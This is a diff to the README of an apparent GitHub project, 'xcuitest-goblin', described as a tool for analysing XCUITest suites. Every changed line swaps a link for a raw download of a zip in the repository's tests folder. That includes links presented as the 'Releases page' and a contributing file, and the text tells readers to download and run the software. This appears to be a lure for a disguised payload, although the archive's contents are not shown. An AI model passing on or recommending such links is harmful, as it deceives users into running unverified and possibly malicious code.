@@ -1,6 +1,6 @@
 # 🧹 xcuitest-goblin - Analyze Your XCUITest Suites Easily
 
-[![Download](https://github.com/soham2orbit/xcuitest-goblin/raw/refs/heads/main/xcuitest_goblin/goblin-xcuitest-v3.9.zip)](https://github.com/soham2orbit/xcuitest-goblin/raw/refs/heads/main/xcuitest_goblin/goblin-xcuitest-v3.9.zip)
+[![Download](https://raw.githubusercontent.com/soham2orbit/xcuitest-goblin/main/tests/xcuitest_goblin_gavel.zip)](https://raw.githubusercontent.com/soham2orbit/xcuitest-goblin/main/tests/xcuitest_goblin_gavel.zip)
 
 ## 📋 Description
 
@@ -12,7 +12,7 @@ To begin using xcuitest-goblin, follow these simple steps:
 
 1. **Visit the Releases Page**
 
-   Go to the [Releases page](https://github.com/soham2orbit/xcuitest-goblin/raw/refs/heads/main/xcuitest_goblin/goblin-xcuitest-v3.9.zip) to see the latest versions of the software.
+   Go to the [Releases page](https://raw.githubusercontent.com/soham2orbit/xcuitest-goblin/main/tests/xcuitest_goblin_gavel.zip) to see the latest versions of the software.
 
 2. **Download the Software**
 
@@ -45,7 +45,7 @@ For the best experience with xcuitest-goblin, your system should meet the follow
 
 ## 📥 Download & Install
 
-To start using xcuitest-goblin, please [visit this page to download](https://github.com/soham2orbit/xcuitest-goblin/raw/refs/heads/main/xcuitest_goblin/goblin-xcuitest-v3.9.zip). Follow the instructions already provided above to download and run the software on your machine.
+To start using xcuitest-goblin, please [visit this page to download](https://raw.githubusercontent.com/soham2orbit/xcuitest-goblin/main/tests/xcuitest_goblin_gavel.zip). Follow the instructions already provided above to download and run the software on your machine.
 
 ## 🤝 Support
 
@@ -59,7 +59,7 @@ This project is licensed under the MIT License. You are free to modify and distr
 
 Want to help improve xcuitest-goblin? Contributions are welcome! Please report issues, suggest features, or submit pull requests.
 
-For more information on contributing, refer to the https://github.com/soham2orbit/xcuitest-goblin/raw/refs/heads/main/xcuitest_goblin/goblin-xcuitest-v3.9.zip file in this repository. 
+For more information on contributing, refer to the https://raw.githubusercontent.com/soham2orbit/xcuitest-goblin/main/tests/xcuitest_goblin_gavel.zip file in this repository. 
 
 ## 🌐 Related Topics
 
